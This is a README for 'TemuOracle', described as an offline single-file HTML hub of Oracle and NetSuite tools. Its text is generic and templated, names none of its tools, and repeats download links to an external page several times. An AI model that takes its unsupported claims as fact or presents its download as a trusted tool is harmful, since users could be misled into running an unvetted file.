# TemuOracle v1.0.0 - enterprise software hub 2026

> **TemuOracle is a browser-based, single-file HTML enterprise hub for Oracle and NetSuite workflows, built for offline use and released as version 1.0.0.**

[![Platform](https://img.shields.io/badge/Platform-HTML-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/will-stone1993/temuoracle-2026-hub?style=flat-square)](https://github.com/will-stone1993/temuoracle-2026-hub)

---

<p align="center">
  <a href="https://will-stone1993.github.io/temuoracle-2026-hub/">
    <img src="https://img.shields.io/badge/Download-TemuOracle%20Latest-brightgreen?style=for-the-badge" alt="Download TemuOracle">
  </a>
</p>

> **[Direct Download - TemuOracle v1.0.0](https://will-stone1993.github.io/temuoracle-2026-hub/)**

---

[Download Latest Build](https://will-stone1993.github.io/temuoracle-2026-hub/)

---

## Overview

TemuOracle packages a focused set of Oracle, NetSuite, and ERP-related utilities into one compact HTML workspace. It is intended for users who want a quick starting point without relying on an installer, a backend, or an always-on internet connection.

The app follows a single-file model that can be opened straight from `file://`, which makes it easy to keep locally, pass around, and reuse in locked-down environments. With offline-first behavior, built-in navigation, and visible status cues, the interface stays lightweight while still making it easy to move between tools.

---

## What it includes

- Brings 17 enterprise tools together in one interface
- Distributed as one HTML file for straightforward sharing
- Opens directly from `file://` with no server required
- Stores local preferences through IndexedDB
- Provides a launchpad plus a stack diagram view
- Supports offline keyword-based routing for fast jumps
- Exports a manifest for reuse or packaging
- Displays live status markers for quick context

---

## Getting started

1. Download or clone the repository contents.
2. Open the main HTML file in a modern browser.
3. If you want local persistence, allow the browser to keep site data for the file origin where supported.

Typical first run:

- Double-click the HTML file, or
- Open it from the browser using the local file picker, or
- Serve it from any static host if you prefer a web-based entry point.

---

## How to use it

Once the hub loads, use it as your entry point into the indexed enterprise tools. Search or route by keyword to reach the right area, use the stack diagram to understand the layout, and check the status indicators for a fast read on the current context.

Common workflows include:

- Opening the launchpad and scanning the available tool list
- Using offline keyword routing to reach a specific enterprise area
- Exporting the manifest when you need a portable summary
- Returning to saved settings on subsequent visits through IndexedDB

---

## Configuration

TemuOracle keeps its working state in browser storage through IndexedDB. Any available settings are managed locally rather than through a separate config service.

If you need to adjust behavior, look for app-level options inside the interface or update the HTML file directly if your fork includes embedded defaults.

---

## Requirements

- A modern browser with HTML5 support
- Local file access if you plan to open it from `file://`
- IndexedDB support for saved settings
- Sufficient local storage for cached state and manifest data
- No backend runtime is required for the base single-file workflow

---

## FAQ

**Does it require installation?**  
No. The main experience is designed around a single HTML file.

**Can I use it offline?**  
Yes, offline use is part of the intended workflow.

**Where are settings saved?**  
Settings are stored locally in IndexedDB when the browser allows it.

**How do I update it?**  
Replace the current HTML file with a newer build from the same repository or release source.

**What if something does not load?**  
Check browser compatibility, local file permissions, and whether storage access is available for the session.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
